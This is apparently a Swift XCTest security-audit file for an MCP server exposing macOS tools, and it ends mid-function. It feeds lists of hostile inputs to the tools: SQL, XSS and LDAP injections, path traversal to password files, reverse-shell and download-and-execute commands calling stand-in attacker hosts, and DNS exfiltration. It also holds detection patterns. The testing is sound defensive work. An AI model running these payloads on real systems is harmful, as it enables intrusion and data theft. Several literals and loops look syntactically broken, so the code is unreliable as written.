//
//  SecurityAuditTests.swift
//  AppleMCPServer
//
//  Created on 2025-10-08.
//

import XCTest
@testable import AppleMCPServer

final class SecurityAuditTests: XCTestCase {

    // MARK: - Properties

    private var logger: Logger!
    private var securityManager: SecurityManager!
    private var toolsRegistry: ToolsRegistry!
    private var server: MCPServer!

    // MARK: - Setup and Teardown

    override func setUp() async throws {
        try await super.setUp()

        // Initialize security components
        let config = LoggingConfiguration.default
        logger = Logger(configuration: config)
        await logger.setupFileLoggingIfNeeded()

        securityManager = SecurityManager(logger: logger)
        toolsRegistry = ToolsRegistry(logger: logger, securityManager: securityManager)

        try await toolsRegistry.initialize()

        let serverConfig = ServerConfiguration.default
        server = MCPServer(
            configuration: serverConfig,
            logger: logger,
            securityManager: securityManager,
            toolsRegistry: toolsRegistry
        )
    }

    override func tearDown() async throws {
        if server != nil && server.isRunning {
            try await server.stop()
        }

        logger = nil
        securityManager = nil
        toolsRegistry = nil
        server = nil

        try await super.tearDown()
    }

    // MARK: - Input Validation and Sanitization Tests

    func testInputValidation_MaliciousParameterInjection() async throws {
        // Test malicious parameter injection attempts
        try await server.start()

        await logger.info("Starting malicious parameter injection test")

        let maliciousInputs = [
            // SQL Injection attempts
            ["shortcutName": "'; DROP TABLE shortcuts; --"],
            ["shortcutName": "' OR '1'='1"],
            ["command": "test'; rm -rf /; echo"],

            // XSS attempts
            ["text": "<script>alert('xss')</script>"],
            ["description": "Test <img src=x onerror=alert('xss')>"],

            // Path traversal attempts
            ["filePath": "../../../etc/passwd"],
            ["path": "/../../../../etc/shadow"],
            ["fileName": "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"],

            // Command injection attempts
            ["command": "test && curl malicious-site.com"],
            ["script": "test; nc -e /bin/sh"],
            ["shell": "test | bash -i"],

            // Buffer overflow attempts
            ["input": String(repeating: "A", count: 10000)],
            ["large_param": String(repeating: "OVERFLOW", count: 5000))],

            // JSON injection attempts
            ["json": "{\"test\":{\"injection\":true}}"],
            ["data": "{\"valid\":false,\"__proto__\":{\"injected\":\"value\"}}"],

            // LDAP injection attempts
            ["username": "admin)(|(objectClass=*"],
            ["filter": "cn=admin)(|(objectClass=*"],

            // NoSQL injection attempts
            ["query": {"$where": {"test": {"$ne": null}}}},
            ["mongo": {"$regex": ".*", "$options": "i"}},

            // Format string attacks
            ["format": "%s%s%s"],
            ["printf": "%x%x%x%x%x"]
        ]

        for (index, maliciousInput) in maliciousInputs {
            await logger.info("Testing malicious input \(index + 1)/\(maliciousInputs.count)")

            // Test with system_info tool
            let systemInfoTool = await toolsRegistry.getTool(name: "system_info")
            let context = MCPExecutionContext(
                clientId: UUID(),
                requestId: "security_test_\(index)_\(UUID().uuidString)",
                toolName: "system_info"
            )

            do {
                let result = try await systemInfoTool!.performExecution(parameters: maliciousInput, context: context)

                // Should either fail gracefully or sanitize input properly
                if result.success {
                    // If successful, verify output doesn't contain malicious content
                    await logger.info("Request succeeded - checking output safety")
                    // Additional output validation would go here
                } else {
                    await logger.info("Request properly rejected malicious input")
                }
            } catch {
                // Expected for many malicious inputs
                await logger.info("Request failed due to malicious input", metadata: [
                    "errorType": String(describing: type(of: error))
                ])
            }
        }

        // Server should remain stable after malicious input attempts
        let serverStatus = await server.getStatus()
        XCTAssertTrue(serverStatus.isRunning, "Server should remain stable after malicious input tests")
    }

    func testInputValidation_ParameterTypeValidation() async throws {
        // Test parameter type validation
        try await server.start()

        let systemInfoTool = await toolsRegistry.getTool(name: "system_info")
        let context = MCPExecutionContext(
            clientId: UUID(),
            requestId: "type_validation_test_\(UUID().uuidString)",
            toolName: "system_info"
        )

        // Test various invalid parameter types
        let invalidTypeInputs = [
            // Array when string expected
            ["name": ["invalid", "type"]],
            ["shortcutName": [1, 2, 3]],

            // Object when string expected
            ["text": {"nested": "object"}],
            ["command": {"invalid": "type"}],

            // Number when string expected
            ["input": 12345],
            ["parameter": 999.99],

            // Boolean when string expected
            ["value": true],
            ["enabled": false],

            // Null values
            ["required_param": nil],
            ["optional_param": nil],

            // Nested malicious structures
            ["data": {"$nested": {"$injection": "attempt"}}],
            ["complex": {"array": [{"object": {"$injection": true}}]}]
        ]

        for (index, invalidInput) in invalidTypeInputs.enumerated() {
            await logger.info("Testing invalid type input \(index + 1)/\(invalidTypeInputs.count)")

            do {
                let result = try await systemInfoTool!.performExecution(parameters: invalidInput, context: context)

                // Should either fail validation or handle gracefully
                if result.success {
                    await logger.warning("Unexpected success with invalid type - verify sanitization")
                } else {
                    await logger.info("Invalid type properly rejected")
                }
            } catch {
                // Expected for invalid types
                await logger.info("Invalid type caused expected error", metadata: [
                    "errorType": String(describing: type(of: error))
                ])
            }
        }
    }

    func testInputValidation_SizeLimitValidation() async throws {
        // Test parameter size limits and boundary conditions
        try await server.start()

        let shortcutsTool = await toolsRegistry.getTool(name: "shortcuts_execute")
        let context = MCPExecutionContext(
            clientId: UUID(),
            requestId: "size_limit_test_\(UUID().uuidString)",
            toolName: "shortcuts_execute"
        )

        // Test size boundary conditions
        let sizeTestCases = [
            // Empty strings
            ["shortcutName": ""],
            ["input": ""],

            // Single character
            ["shortcutName": "a"],
            ["text": "1"],

            // Maximum reasonable sizes
            ["shortcutName": String(repeating: "a", count: 255)],
            ["description": String(repeating: "test", count: 100)],

            // Oversized inputs (should be rejected)
            ["shortcutName": String(repeating: "oversized", count: 1000)],
            ["large_param": String(repeating: "X", count: 100000))],

            // Deep nesting
            ["nested": createDeepNestedObject(depth: 100)],

            // Wide arrays
            ["array": Array(0..<10000)],

            // Unicode edge cases
            ["unicode": "🔥" + String(repeating: "测试", count: 1000))],
            ["emoji": String(repeating: "😈", count: 5000))]
        ]

        for (index, testCase) in sizeTestCases.enumerated() {
            await logger.info("Testing size limit case \(index + 1)/\(sizeTestCases.count)")

            do {
                let result = try await shortcutsTool!.performExecution(parameters: testCase, context: context)

                if result.success {
                    await logger.info("Size test case passed validation")
                } else {
                    await logger.info("Size test case properly rejected")
                }
            } catch {
                await logger.info("Size test case caused expected error", metadata: [
                    "errorType": String(describing: type(of: error))
                ])
            }
        }
    }

    func testInputValidation_EncodingAndSpecialCharacters() async throws {
        // Test handling of special characters and encoding issues
        try await server.start()

        let voiceControlTool = await toolsRegistry.getTool(name: "voice_control")
        let context = MCPExecutionContext(
            clientId: UUID(),
            requestId: "encoding_test_\(UUID().uuidString)",
            toolName: "voice_control"
        )

        let specialCharacterCases = [
            // Unicode and encoding issues
            ["text": "Hello \u{0000} world"], // Null byte
            ["command": "Test \u{FFFD} invalid"], // Replacement character
            ["input": "CAF\u{00E9}"], // Accented characters
            ["emoji": "🎉🚀💻"], // Emoji

            // Control characters
            ["control": "Hello\u{0001}\u{0002}\u{0003}"],
            ["newline": "test\n\r\t"],
            ["backspace": "test\u{0008}character"],

            // Script injection variations
            ["script": "<script src='evil.js'></script>"],
            ["iframe": "<iframe src='javascript:alert(1)'></iframe>"],
            ["data": "data:text/html,<script>alert(1)</script>"],

            // HTML encoding variations
            ["html_encoded": "&lt;script&gt;alert('xss')&lt;/script&gt;"],
            ["url_encoded": "%3Cscript%3Ealert%28%27xss%27%29%3C%2Fscript%3E"],
            ["double_encoded": "%253Cscript%253E"],

            // CSS injection
            ["css": "background:url(javascript:alert(1))"],
            ["style": "expression(alert('xss'))"],

            // SQL injection variations
            ["sql": "'; EXEC xp_cmdshell('dir'); --"],
            ["mysql": "' UNION SELECT * FROM users --"],

            // NoSQL injection
            ["nosql": {"$ne": null}],
            ["mongo": {"$where": "this.test == true"}],

            // LDAP injection
            ["ldap": "*)(uid=*"],
            ["filter": "(|(objectClass=*)(uid=admin))"]
        ]

        for (index, testCase) in specialCharacterCases.enumerated() {
            await logger.info("Testing special character case \(index + 1)/\(specialCharacterCases.count)")

            do {
                let result = try await voiceControlTool!.performExecution(parameters: testCase, context: context)

                if result.success {
                    // Verify output is properly sanitized
                    let output = result.content
                    let isSanitized = verifyOutputSanitization(output: output, input: testCase)
                    XCTAssertTrue(isSanitized, "Output should be properly sanitized")
                    await logger.info("Special characters properly handled and sanitized")
                } else {
                    await logger.info("Special characters properly rejected")
                }
            } catch {
                await logger.info("Special characters caused expected error")
            }
        }
    }

    func testInputValidation_FilePathAndResourceSecurity() async throws {
        // Test file path validation and resource access security
        try await server.start()

        let systemInfoTool = await toolsRegistry.getTool(name: "system_info")
        let context = MCPExecutionContext(
            clientId: UUID(),
            requestId: "file_path_test_\(UUID().uuidString)",
            toolName: "system_info"
        )

        let dangerousFilePaths = [
            // Path traversal attempts
            ["path": "../../../etc/passwd"],
            ["file": "/etc/passwd"],
            ["directory": "../../../../root"],

            // Windows path traversal
            ["path": "..\\..\\..\\windows\\system32\\config\\sam"],
            ["file": "C:\\Windows\\System32\\drivers\\etc\\hosts"],

            // Absolute path attempts
            ["path": "/etc/shadow"],
            ["file": "/var/log/auth.log"],
            ["directory": "/Users/administrator"],

            // Symbolic link attempts
            ["path": "/tmp/link_to_sensitive"],
            ["file": "./sensitive_symlink"],

            // Resource injection
            ["resource": "file:///etc/passwd"],
            ["url": "file://localhost/etc/passwd"],

            // Protocol injection
            ["protocol": "gopher://malicious.com:70/_"],
            ["scheme": "dict://malicious.com:6379/"],

            // Local file inclusion
            ["include": "php://input"],
            ["file": "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg=="],

            // Dangerous extensions
            ["file": "malicious.exe"],
            ["script": "virus.bat"],
            ["payload": "trojan.sh"]
        ]

        for (index, dangerousPath) in dangerousFilePaths.enumerated() {
            await logger.info("Testing dangerous file path \(index + 1)/\(dangerousFilePaths.count)")

            do {
                let result = try await systemInfoTool!.performExecution(parameters: dangerousPath, context: context)

                if result.success {
                    // Verify no sensitive information leaked
                    let output = result.content
                    let containsSensitiveInfo = checkForSensitiveInformation(output: output)
                    XCTAssertFalse(containsSensitiveInfo, "Output should not contain sensitive file information")
                    await logger.info("File path properly sanitized")
                } else {
                    await logger.info("Dangerous file path properly rejected")
                }
            } catch {
                await logger.info("Dangerous file path caused expected error")
            }
        }
    }

    func testInputValidation_CommandAndScriptInjection() async throws {
        // Test command and script injection prevention
        try await server.start()

        let shortcutsTool = await toolsRegistry.getTool(name: "shortcuts_execute")
        let voiceControlTool = await toolsRegistry.getTool(name: "voice_control")

        let commandInjectionCases = [
            // Command separators
            ["command": "test && curl malicious.com"],
            ["script": "test; nc -e /bin/sh attacker.com 4444"],
            ["input": "test | bash -i"],
            ["payload": "test `rm -rf /`"],
            ["cmd": "test $(curl malicious.com)"],

            // Pipe and redirection
            ["command": "test > /etc/passwd"],
            ["script": "test < /etc/passwd"],
            ["input": "test >> malicious.log"],

            // Background execution
            ["command": "test & nc -l 4444"],
            ["script": "test ; nohup bash -i &"],

            // Logic operators
            ["command": "test || curl malicious.com"],
            ["script": "test && ping -c 10 127.0.0.1"],

            // Variable assignment
            ["input": "TEST=$(curl malicious.com)"],
            ["command": "export PATH=/malicious:$PATH"],

            // Function definition
            ["script": "malicious() { curl malicious.com; }; malicious"],

            // Script execution
            ["command": "./malicious.sh"],
            ["script": "bash malicious_script"],
            ["input": "source malicious_file"],

            // Encoded commands
            ["command": "echo 'Y3VybCBtYWxpY2lvdXMuY29t' | base64 -d | bash"],
            ["script": "$(printf '\\x63\\x75\\x72\\x6c\\x20\\x6d\\x61\\x6c\\x69\\x63\\x69\\x6f\\x75\\x73\\x2e\\x63\\x6f\\x6d')"],

            // DNS exfiltration
            ["command": "nslookup sensitive_data attacker.com"],
            ["script": "dig sensitive_info @malicious.com"],

            // Download and execute
            ["command": "curl malicious.com/malware.sh | bash"],
            ["script": "wget -O - attacker.com/payload.sh | sh"],
            ["input": "fetch http://evil.com/virus && ./virus"]
        ]

        for (index, injectionCase) in commandInjectionCases.enumerated() {
            await logger.info("Testing command injection case \(index + 1)/\(commandInjectionCases.count)")

            let context = MCPExecutionContext(
                clientId: UUID(),
                requestId: "cmd_injection_test_\(index)_\(UUID().uuidString)",
                toolName: index % 2 == 0 ? "shortcuts_execute" : "voice_control"
            )

            let tool = index % 2 == 0 ? shortcutsTool : voiceControlTool

            do {
                let result = try await tool!.performExecution(parameters: injectionCase, context: context)

                if result.success {
                    // Verify no command execution occurred
                    let output = result.content
                    let containsCommandOutput = checkForCommandExecution(output: output)
                    XCTAssertFalse(containsCommandOutput, "Output should not contain command execution results")
                    await logger.info("Command injection properly prevented")
                } else {
                    await logger.info("Command injection properly rejected")
                }
            } catch {
                await logger.info("Command injection caused expected error")
            }
        }
    }

    // MARK: - Helper Methods

    private func createDeepNestedObject(depth: Int) -> Any {
        if depth <= 0 {
            return "leaf"
        }
        return ["nested": createDeepNestedObject(depth: depth - 1)]
    }

    private func verifyOutputSanitization(output: MCPResponseContent, input: [String: Any]) -> Bool {
        // Check if output properly sanitizes potentially malicious input
        let outputString = String(describing: output.content)

        // Check for common attack patterns in output
        let dangerousPatterns = [
            "<script>", "</script>", "javascript:", "vbscript:",
            "onclick", "onerror", "onload", "eval(", "alert(",
            "document.cookie", "window.location", "XMLHttpRequest",
            "SELECT * FROM", "DROP TABLE", "INSERT INTO", "DELETE FROM",
            " UNION SELECT ", " OR 1=1", " AND 1=1",
            "$where", "$ne", "$regex", "$in",
            "../../etc/passwd", "\\..\\..\\windows\\system32"
        ]

        for pattern in dangerousPatterns {
            if outputString.lowercased().contains(pattern.lowercased()) {
                return false
            }
        }

        return true
    }

    private func checkForSensitiveInformation(output: MCPResponseContent) -> Bool {
        let outputString = String(describing: output.content).lowercased()

        let sensitivePatterns = [
            "password", "passwd", "secret", "key", "token",
            "private", "confidential", "admin", "root",
            "/etc/passwd", "/etc/shadow", "sam", "system32",
            "ssh-rsa", "-----begin", "-----end"
        ]

        for pattern in sensitivePatterns {
            if outputString.contains(pattern) {
                return true
            }
        }

        return false
    }

    private func checkForCommandExecution(output: MCPResponseContent) -> Bool {
        let outputString = String(describing: output.content).lowercased()

        let commandExecutionPatterns = [
            "uid=", "gid=", "groups=", "whoami", "id=",
            "bash:", "sh:", "zsh:", "fish:",
            "network", "active", "connections",
            "bytes received", "bytes sent",
            "packet loss", "round-trip",
            "curl", "wget", "nc ", "netcat",
            "malicious.com", "attacker.com", "evil.com"
        ]

        for pattern in commandExecutionPatterns {
            if outputString.contains(pattern) {
                return true
            }
        }

        return false
    }

    // MARK: - Authentication and Authorization Tests

    func testAuthentication_UnauthorizedAccess() async throws {
        // Test unauthorized access scenarios
        try await server.start()

        await logger.info("Starting unauthorized access test")

        // Test with invalid client contexts
        let invalidContexts: [(UUID?, String?, String)] = [
            (nil, "req_123", "system_info"),                    // No client ID
            (UUID(), "", "system_info"),                        // Empty request ID
            (UUID(), "req_123", ""),                            // Empty tool name
            (UUID(uuidString: "00000000-0000-0000-0000-000000000000"), "req_123", "system_info") // Nil UUID
        ]

        for (index, (clientId, requestId, toolName)) in invalidContexts {
            await logger.info("Testing invalid context \(index + 1)/\(invalidContexts.count)")

            let context = MCPExecutionContext(
                clientId: clientId ?? UUID(),
                requestId: requestId,
                toolName: toolName
            )

            // Try to get a tool
            let tool = await toolsRegistry.getTool(name: toolName)

            if tool != nil {
                do {
                    let params = [
                        "categories": ["device"],
                        "includeSensitive": false
                    ] as [String: Any]

                    let result = try await tool!.performExecution(parameters: params, context: context)

                    // Should fail with invalid context
                    XCTAssertFalse(result.success, "Invalid context should result in failure")
                    XCTAssertNotNil(result.error, "Should return error for invalid context")
                } catch {
                    // Expected behavior
                    XCTAssertTrue(true, "Invalid context should throw error")
                }
            } else {
                // Tool not found - also acceptable
                XCTAssertTrue(true, "Tool not found is acceptable for invalid context")
            }
        }

        // Server should remain stable after unauthorized access attempts
        let serverStatus = await server.getStatus()
        XCTAssertTrue(serverStatus.isRunning, "Server should remain stable after unauthorized access tests")
    }

    func testAuthorization_PermissionBoundaryTesting() async throws {
        // Test permission boundary enforcement
        try await server.start()

        await logger.info("Starting permission boundary test")

        // Test tools with different permission requirements
        let permissionTests: [(String, [PermissionType])] = [
            ("system_info", [.systemInfo]),
            ("shortcuts_execute", [.shortcuts]),
            ("voice_control", [.voiceControl]),
            ("shortcuts_list", [.shortcuts]),
            ("health_check", [.systemInfo])
        ]

        for (toolName, requiredPermissions) in permissionTests {
            await logger.info("Testing permission boundaries for \(toolName)")

            let tool = await toolsRegistry.getTool(name: toolName)
            if tool == nil {
                await logger.warning("Tool \(toolName) not found, skipping permission test")
                continue
            }

            // Test with insufficient permissions
            let insufficientContext = MCPExecutionContext(
                clientId: UUID(),
                requestId: "permission_test_\(UUID().uuidString)",
                toolName: toolName,
                metadata: ["permissions": ["unauthorized"]]
            )

            do {
                let params = getTestParameters(for: toolName)
                let result = try await tool!.performExecution(parameters: params, context: insufficientContext)

                // Should either fail or not return sensitive information
                if result.success {
                    // Verify no sensitive data leaked
                    let output = result.content
                    let containsSensitiveInfo = checkForSensitiveInformation(output: output)
                    XCTAssertFalse(containsSensitiveInfo, "Should not leak sensitive info with insufficient permissions")
                } else {
                    // Expected behavior
                    await logger.info("Tool \(toolName) properly rejected insufficient permissions")
                }
            } catch {
                // Expected for insufficient permissions
                await logger.info("Tool \(toolName) threw error with insufficient permissions")
            }
        }
    }

    func testAuthorization_RoleBasedAccessControl() async throws {
        // Test role-based access control scenarios
        try await server.start()

        await logger.info("Starting role-based access control test")

        // Define different user roles and their expected permissions
        let userRoles: [String: [PermissionType]] = [
            "guest": [],                              // No permissions
            "user": [.shortcuts],                     // Basic user permissions
            "power_user": [.shortcuts, .voiceControl], // Enhanced permissions
            "admin": [.shortcuts, .voiceControl, .systemInfo], // Full permissions
            "system": [.shortcuts, .voiceControl, .systemInfo] // System permissions
        ]

        let toolsToTest = ["system_info", "shortcuts_execute", "voice_control", "health_check"]

        for (role, permissions) in userRoles {
            await logger.info("Testing role: \(role)")

            for toolName in toolsToTest {
                let tool = await toolsRegistry.getTool(name: toolName)
                if tool == nil { continue }

                let context = MCPExecutionContext(
                    clientId: UUID(),
                    requestId: "role_test_\(role)_\(toolName)_\(UUID().uuidString)",
                    toolName: toolName,
                    metadata: [
                        "role": role,
                        "permissions": permissions.map { $0.rawValue }
                    ]
                )

                do {
                    let params = getTestParameters(for: toolName)
                    let result = try await tool!.performExecution(parameters: params, context: context)

                    let requiredPermissions = getRequiredPermissions(for: toolName)
                    let hasPermission = permissions.contains { requiredPermissions.contains($0) }

                    if hasPermission {
                        XCTAssertTrue(result.success, "Role \(role) should have access to \(toolName)")
                    } else {
                        if result.success {
                            // Verify no sensitive data was returned
                            let output = result.content
                            let containsSensitiveInfo = checkForSensitiveInformation(output: output)
                            XCTAssertFalse(containsSensitiveInfo, "Should not return sensitive data to unauthorized role")
                        } else {
                            // Expected behavior
                            await logger.info("Role \(role) properly denied access to \(toolName)")
                        }
                    }
                } catch {
                    // Expected for unauthorized access
                    if !permissions.contains(where: { requiredPermissions.contains($0) }) {
                        await logger.info("Role \(role) correctly threw error for \(toolName)")
                    }
                }
            }
        }
    }

    func testAuthentication_SessionManagement() async throws {
        // Test session management and security
        try await server.start()

        await logger.info("Starting session management test")

        // Test session hijacking scenarios
        let clientId = UUID()
        let validSessionId = UUID().uuidString

        // Create a valid session
        let validContext = MCPExecutionContext(
            clientId: clientId,
            requestId: "session_test_1",
            toolName: "system_info"
        )

        // Test with same client but different session characteristics
        let hijackScenarios: [(String, MCPExecutionContext)] = [
            ("Different request ID reuse", MCPExecutionContext(
                clientId: clientId,
                requestId: validSessionId, // Reusing same request ID
                toolName: "system_info"
            )),
            ("Same session different tool", MCPExecutionContext(
                clientId: clientId,
                requestId: validSessionId,
                toolName: "shortcuts_execute"
            )),
            ("Rapid successive requests", MCPExecutionContext(
                clientId: clientId,
                requestId: UUID().uuidString, // New request ID
                toolName: "system_info"
            ))
        ]

        for (scenarioName, context) in hijackScenarios {
            await logger.info("Testing scenario: \(scenarioName)")

            let tool = await toolsRegistry.getTool(name: context.toolName)
            if tool == nil { continue }

            do {
                let params = getTestParameters(for: context.toolName)
                let result = try await tool!.performExecution(parameters: params, context: context)

                // Should either work normally or be rate limited
                if result.success {
                    await logger.info("Scenario \(scenarioName) succeeded (normal behavior)")
                } else {
                    // Check if it's a rate limiting or session security error
                    if let error = result.error {
                        let isSecurityError = error.message.contains("rate") ||
                                           error.message.contains("session") ||
                                           error.message.contains("security")
                        if isSecurityError {
                            await logger.info("Scenario \(scenarioName) properly blocked for security reasons")
                        }
                    }
                }
            } catch {
                // Some session security measures might throw errors
                await logger.info("Scenario \(scenarioName) threw error (possible security measure)")
            }
        }
    }

    func testAuthorization_EscalationAttempts() async throws {
        // Test privilege escalation attempts
        try await server.start()

        await logger.info("Starting privilege escalation test")

        // Test various escalation techniques
        let escalationAttempts: [(String, [String: Any])] = [
            ("Permission injection", ["permissions": ["admin", "system", "all"]]),
            ("Role override", ["role": "admin", "override": true]),
            ("Privilege bypass", ["bypass_permissions": true, "elevate": "admin"]),
            ("System access", ["access_level": "system", "privileges": "all"]),
            ("Root escalation", ["user": "root", "uid": 0]),
            ("Admin impersonation", ["impersonate": "admin", "token": "fake_admin_token"]),
            ("Context manipulation", ["metadata": ["is_admin": true, "can_elevate": true]]),
            ("Header injection", ["headers": ["X-Admin-Access": "true", "X-Privileged": "all"]]),
            ("Token manipulation", ["auth_token": "admin_access_token", "scope": "all"]),
            ("Parameter override", ["admin_mode": true, "debug": true, "escalate": true])
        ]

        for (attackName, maliciousParams) in escalationAttempts {
            await logger.info("Testing escalation attempt: \(attackName)")

            let context = MCPExecutionContext(
                clientId: UUID(),
                requestId: "escalation_test_\(UUID().uuidString)",
                toolName: "system_info",
                metadata: maliciousParams
            )

            let tool = await toolsRegistry.getTool(name: "system_info")
            if tool == nil { continue }

            do {
                let params = ["categories": ["system", "security"], "includeSensitive": true]
                let result = try await tool!.performExecution(parameters: params, context: context)

                if result.success {
                    // Verify no privileged information was leaked
                    let output = result.content
                    let containsSensitiveInfo = checkForSensitiveInformation(output: output)
                    let containsSystemInfo = output.description.contains("system") ||
                                           output.description.contains("admin") ||
                                           output.description.contains("privilege")

                    XCTAssertFalse(containsSensitiveInfo, "Escalation attempt \(attackName) should not leak sensitive info")
                    XCTAssertFalse(containsSystemInfo, "Escalation attempt \(attackName) should not access system info")
                } else {
                    // Expected behavior - escalation should be blocked
                    await logger.info("Escalation attempt \(attackName) properly blocked")
                }
            } catch {
                // Expected - escalation attempts should fail
                await logger.info("Escalation attempt \(attackName) threw error (expected)")
            }
        }

        // Verify server remains secure after escalation attempts
        let serverStatus = await server.getStatus()
        XCTAssertTrue(serverStatus.isRunning, "Server should remain secure after escalation attempts")
    }

    func testAuthentication_BruteForceProtection() async throws {
        // Test brute force protection mechanisms
        try await server.start()

        await logger.info("Starting brute force protection test")

        let clientId = UUID()
        let toolName = "system_info"
        let tool = await toolsRegistry.getTool(name: toolName)
        if tool == nil {
            await logger.warning("Tool \(toolName) not found for brute force test")
            return
        }

        var failedAttempts = 0
        let maxAttempts = 20

        // Simulate rapid failed authentication attempts
        for attempt in 1...maxAttempts {
            let context = MCPExecutionContext(
                clientId: clientId,
                requestId: "brute_force_attempt_\(attempt)",
                toolName: toolName,
                metadata: ["auth_token": "invalid_token_\(attempt)"]
            )

            do {
                let params = ["test": "unauthorized_access"]
                let result = try await tool!.performExecution(parameters: params, context: context)

                if !result.success {
                    failedAttempts += 1
                    await logger.info("Failed attempt \(attempt)/\(maxAttempts)")
                }
            } catch {
                failedAttempts += 1
                await logger.info("Failed attempt \(attempt)/\(maxAttempts) with error")
            }

            // Small delay to simulate rapid attempts
            try? await Task.sleep(nanoseconds: 100_000_000) // 0.1 seconds
        }

        // Now try a legitimate request to see if we're rate limited
        let legitimateContext = MCPExecutionContext(
            clientId: clientId,
            requestId: "legitimate_after_brute_force",
            toolName: toolName
        )

        do {
            let params = ["categories": ["basic"]]
            let result = try await tool!.performExecution(parameters: params, context: legitimateContext)

            // If the server has brute force protection, this might be rate limited
            if !result.success {
                if let error = result.error {
                    let isRateLimited = error.message.contains("rate") ||
                                       error.message.contains("limit") ||
                                       error.message.contains("blocked")

                    if isRateLimited {
                        await logger.info("Brute force protection is active - legitimate request rate limited")
                        XCTAssertTrue(true, "Brute force protection working")
                    } else {
                        await logger.info("Request failed for other reasons (not rate limiting)")
                    }
                }
            } else {
                await logger.info("Legitimate request succeeded after brute force attempts")
            }
        } catch {
            await logger.info("Legitimate request threw error after brute force attempts")
        }

        // Verify we had sufficient failed attempts to trigger protection
        XCTAssertGreaterThan(failedAttempts, maxAttempts / 2, "Should have had multiple failed attempts")
    }

    // MARK: - Helper Methods for Authentication/Authorization

    private func getTestParameters(for toolName: String) -> [String: Any] {
        switch toolName {
        case "system_info":
            return ["categories": ["device"], "includeSensitive": false]
        case "shortcuts_execute":
            return ["shortcutName": "test_shortcut"]
        case "voice_control":
            return ["command": "test command"]
        case "shortcuts_list":
            return ["includeSystemShortcuts": false]
        case "health_check":
            return [:]
        default:
            return [:]
        }
    }

    private func getRequiredPermissions(for toolName: String) -> [PermissionType] {
        switch toolName {
        case "system_info":
            return [.systemInfo]
        case "shortcuts_execute", "shortcuts_list":
            return [.shortcuts]
        case "voice_control":
            return [.voiceControl]
        case "health_check":
            return [.systemInfo]
        default:
            return []
        }
    }

    // MARK: - Attack Surface Analysis and Penetration Testing

    func testAttackSurface_DictionaryAttackProtection() async throws {
        // Test protection against dictionary attacks
        try await server.start()

        await logger.info("Starting dictionary attack protection test")

        let commonTokens = [
            "admin", "password", "123456", "token", "access", "key",
            "secret", "auth", "bearer", "jwt", "session", "login",
            "user", "guest", "test", "demo", "api", "default",
            "root", "administrator", "system", "service", "client"
        ]

        let clientId = UUID()
        let tool = await toolsRegistry.getTool(name: "system_info")
        if tool == nil {
            await logger.warning("Tool system_info not found for dictionary attack test")
            return
        }

        var failedAttempts = 0
        let maxAttempts = 50

        // Simulate dictionary attack on authentication
        for (index, token) in commonTokens.enumerated() {
            if index >= maxAttempts { break }

            let context = MCPExecutionContext(
                clientId: clientId,
                requestId: "dict_attack_\(index)",
                toolName: "system_info",
                metadata: ["auth_token": token]
            )

            do {
                let params = ["test": "unauthorized"]
                let result = try await tool!.performExecution(parameters: params, context: context)

                if !result.success {
                    failedAttempts += 1
                    await logger.info("Dictionary attack attempt \(index + 1) failed with token: \(token)")
                }
            } catch {
                failedAttempts += 1
                await logger.info("Dictionary attack attempt \(index + 1) threw error with token: \(token)")
            }
        }

        // Try legitimate request after dictionary attack
        let legitimateContext = MCPExecutionContext(
            clientId: clientId,
            requestId: "legitimate_after_dict_attack",
            toolName: "system_info"
        )

        do {
            let params = ["categories": ["basic"]]
            let result = try await tool!.performExecution(parameters: params, context: legitimateContext)

            // Check if rate limiting/protection is active
            if !result.success {
                if let error = result.error {
                    let isRateLimited = error.message.contains("rate") ||
                                       error.message.contains("limit") ||
                                       error.message.contains("blocked") ||
                                       error.message.contains("temporary")

                    if isRateLimited {
                        await logger.info("Dictionary attack protection is active")
                        XCTAssertTrue(true, "Dictionary attack protection working")
                    }
                }
            }
        } catch {
            await logger.info("Legitimate request blocked after dictionary attack (protection active)")
        }

        XCTAssertGreaterThan(failedAttempts, commonTokens.count / 2, "Should have failed multiple dictionary attempts")
    }

    func testAttackSurface_TimingAttackAnalysis() async throws {
        // Test for timing attack vulnerabilities
        try await server.start()

        await logger.info("Starting timing attack analysis test")

        let tool = await toolsRegistry.getTool(name: "system_info")
        if tool == nil { return }

        // Test different input lengths to detect timing variations
        let testInputs = [
            "a", "ab", "abc", "abcd", "abcde",
            "short", "medium_length_string", "very_long_string_that_might_take_longer_to_process"
        ]

        var timingResults: [String: TimeInterval] = [:]

        for input in testInputs {
            let context = MCPExecutionContext(
                clientId: UUID(),
                requestId: "timing_test_\(UUID().uuidString)",
                toolName: "system_info"
            )

            // Measure execution time
            let startTime = CFAbsoluteTimeGetCurrent()

            do {
                let params = ["test_param": input]
                let _ = try await tool!.performExecution(parameters: params, context: context)

                let endTime = CFAbsoluteTimeGetCurrent()
                let executionTime = endTime - startTime
                timingResults[input] = executionTime

                await logger.info("Input '\(input)' took \(executionTime * 1000)ms")
            } catch {
                let endTime = CFAbsoluteTimeGetCurrent()
                let executionTime = endTime - startTime
                timingResults[input] = executionTime

                await logger.info("Input '\(input)' failed after \(executionTime * 1000)ms")
            }
        }

        // Analyze timing variations
        let times = Array(timingResults.values)
        let averageTime = times.reduce(0, +) / Double(times.count)
        let maxTime = times.max() ?? 0
        let minTime = times.min() ?? 0
        let timeVariation = maxTime - minTime

        await logger.info("Timing analysis - Average: \(averageTime * 1000)ms, Variation: \(timeVariation * 1000)ms")

        // Check for significant timing variations that might indicate vulnerabilities
        let significantVariation = timeVariation > (averageTime * 2.0)
        if significantVariation {
            await logger.warning("Significant timing variation detected - potential timing attack vulnerability")
        }

        // Timing variations should be reasonable (not too large)
        XCTAssertLessThan(timeVariation, 1.0, "Timing variation should be less than 1 second")
    }

    func testAttackSurface_MemoryExhaustionAttempts() async throws {
        // Test protection against memory exhaustion attacks
        try await server.start()

        await logger.info("Starting memory exhaustion attack test")

        let tool = await toolsRegistry.getTool(name: "system_info")
        if tool == nil { return }

        // Test with increasingly large payloads
        let memoryBombSizes = [1000, 10000, 100000, 1000000, 10000000]

        for size in memoryBombSizes {
            await logger.info("Testing memory bomb with size: \(size) characters")

            let largePayload = String(repeating: "A", count: size)
            let context = MCPExecutionContext(
                clientId: UUID(),
                requestId: "memory_bomb_\(size)_\(UUID().uuidString)",
                toolName: "system_info"
            )

            do {
                let params = [
                    "large_param": largePayload,
                    "nested": ["data": largePayload],
                    "array": Array(repeating: largePayload, count: min(10, size / 1000))
                ]

                let startTime = CFAbsoluteTimeGetCurrent()
                let result = try await tool!.performExecution(parameters: params, context: context)
